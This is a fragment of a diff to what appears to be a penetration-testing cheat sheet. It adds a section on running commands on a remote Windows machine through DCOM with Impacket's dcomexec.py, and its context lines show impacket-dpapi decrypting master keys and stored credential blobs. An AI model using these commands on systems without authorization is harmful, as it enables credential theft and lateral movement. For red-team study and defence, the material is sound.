@@ -89,3 +89,15 @@ impacket-dpapi -master <masterkeyfile> -sid SID -password <password_of_the_user>
 ```bash
 impacket-dpapi -key <decrypted_master_key> -cred <encrypted_cred_blob>
 ```
+
+
+
+
+
+## 9. Executing Commands Via DCOM on a remote machine
+
+
+```bash
+dcomexec.py domain/username:password@ip -dc-ip <ip> -M MMC20 'command'
+```
+
